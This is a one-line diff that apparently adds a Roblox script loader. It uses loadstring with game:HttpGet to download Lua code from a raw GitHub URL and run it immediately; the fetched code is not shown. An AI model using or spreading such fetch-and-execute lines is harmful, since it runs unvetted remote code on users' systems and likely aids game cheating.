@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khaoswithaKZ/SoyAdri/refs/heads/main/AstroZ"))()
